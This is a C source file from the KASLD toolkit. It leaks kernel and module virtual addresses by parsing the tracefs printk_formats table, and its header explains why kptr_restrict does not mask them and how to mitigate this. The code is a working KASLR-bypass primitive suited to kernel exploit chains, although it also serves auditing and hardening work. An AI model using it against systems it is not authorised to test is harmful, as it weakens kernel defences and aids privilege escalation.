// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Harvest kernel text/rodata virtual addresses from the ftrace printk-format
// table (/sys/kernel/tracing/printk_formats).
//
// Every trace_printk() / bpf_trace_printk() format string is recorded in the
// kernel's __trace_printk_fmt section; tracefs exposes the table as lines of
//   0x<addr> : "<format>"
// where <addr> is the address of the format string in kernel (or module)
// rodata. The address is printed with a bare "0x%lx" — NOT through %pK and NOT
// behind the kallsyms_show_value() gate — so unlike /proc/kallsyms it is NOT
// subject to kptr_restrict. The tracefs file is mode 0444 and tracefs honours a
// "gid=" mount option, so on systems configured for unprivileged tracing (a
// "tracing" group) the table is readable without root.
//
// A format-string address is an interior point of the kernel image (or of a
// module): it bounds the kernel text base from above, and with the image size
// from below.
//
// Leak primitive:
//   Data leaked:      kernel/module rodata virtual addresses (format strings)
//   Kernel subsystem: kernel/trace — the __trace_printk_fmt table
//   Data structure:   trace_bprintk_fmt_list / __trace_printk_fmt section
//   Address type:     virtual (kernel text/rodata, or module)
//   Method:           parsed (tracefs table read)
//   Status:           information exposure (raw 0x%lx, no kptr_restrict gate)
//   Access check:     tracefs mount perms only (file is 0444); NOT
//   kptr_restrict
//
// Caveat: the table is only populated once trace_printk()/bpf_trace_printk()
// (e.g. a BPF program using bpf_printk) has run; on a clean system it may be
// empty, in which case this yields nothing.
//
// Mitigations:
//   Mount tracefs root-only (omit gid=) to deny unprivileged reads. There is no
//   kptr_restrict gate on the printed address, so kptr_restrict does not help.
// ---
// <bcoles@gmail.com>

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <stdio.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads kernel/module rodata virtual addresses from the ftrace printk "
    "format table (/sys/kernel/tracing/printk_formats). Each entry is printed "
    "as a bare 0x%lx address, with no kptr_restrict / kallsyms_show_value "
    "gate, "
    "so it discloses real kernel addresses where /proc/kallsyms would be "
    "masked. The file is mode 0444 under tracefs (gid=-mountable), so it can "
    "be "
    "readable without root on systems set up for unprivileged tracing. Each "
    "format-string address is an interior point bounding the kernel text base. "
    "Only populated once trace_printk()/bpf_trace_printk() has run.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "note:bypasses_kptr_restrict\n");

static const char *const PATHS[] = {
    "/sys/kernel/tracing/printk_formats",
    "/sys/kernel/debug/tracing/printk_formats",
};

int main(int argc, char **argv) {
  kasld_cli(argc, argv);

  FILE *f = NULL;
  const char *path = NULL;
  for (size_t i = 0; i < sizeof(PATHS) / sizeof(PATHS[0]); i++) {
    f = kasld_fopen(PATHS[i], "r");
    if (f) {
      path = PATHS[i];
      break;
    }
    if (errno == EACCES || errno == EPERM)
      return KASLD_EXIT_NOPERM;
  }
  if (!f)
    return KASLD_EXIT_UNAVAILABLE;

  kasld_info("reading %s ...", path);

  unsigned long text_lo = 0, text_hi = 0, mod_lo = 0, mod_hi = 0;
  int have_text = 0, have_mod = 0;
  char line[1024];

  /* Lines: 0x<addr> : "<format>". %lx consumes the 0x prefix. */
  while (fgets(line, sizeof(line), f)) {
    unsigned long a;
    if (sscanf(line, "%lx :", &a) != 1 || a == 0)
      continue;
    if (kasld_addr_is_kernel_text(a)) {
      if (!have_text || a < text_lo)
        text_lo = a;
      if (!have_text || a > text_hi)
        text_hi = a;
      have_text = 1;
    } else if (kasld_addr_is_module_region(a)) {
      if (!have_mod || a < mod_lo)
        mod_lo = a;
      if (!have_mod || a > mod_hi)
        mod_hi = a;
      have_mod = 1;
    }
  }
  fclose(f);

  if (!have_text && !have_mod) {
    kasld_info("no kernel/module addresses in printk_formats "
               "(table empty — no trace_printk/bpf_printk activity?)");
    return KASLD_EXIT_UNAVAILABLE;
  }

  /* Emit the lowest and highest witnesses per region: the low point bounds the
   * text base from above tightly, the high point bounds it from below (with the
   * image size). Both are interior samples (pos=interior via _sample). */
  if (have_text) {
    kasld_info("kernel text/rodata format addresses: 0x%lx-0x%lx", text_lo,
               text_hi);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, text_lo,
                        "printk_fmt", CONF_PARSED);
    if (text_hi != text_lo)
      kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, text_hi,
                          "printk_fmt", CONF_PARSED);
  }
  if (have_mod) {
    kasld_info("module format addresses: 0x%lx-0x%lx", mod_lo, mod_hi);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_REGION, mod_lo,
                        "printk_fmt", CONF_PARSED);
    if (mod_hi != mod_lo)
      kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_REGION, mod_hi,
                          "printk_fmt", CONF_PARSED);
  }
  return 0;
}
